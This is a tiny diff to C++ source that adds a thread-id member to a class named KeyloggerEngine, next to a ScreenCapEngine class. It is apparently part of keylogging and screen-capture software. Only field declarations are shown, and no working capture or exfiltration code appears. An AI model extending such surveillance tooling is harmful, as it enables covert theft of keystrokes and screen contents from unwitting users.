@@ -34,6 +34,7 @@ class KeyloggerEngine {
     std::string buffer;
     std::mutex bufferLock;
     std::string windowTitle, lastWindowTitle;
+    DWORD hookThreadId = 0;
 };
 
 class ScreenCapEngine {
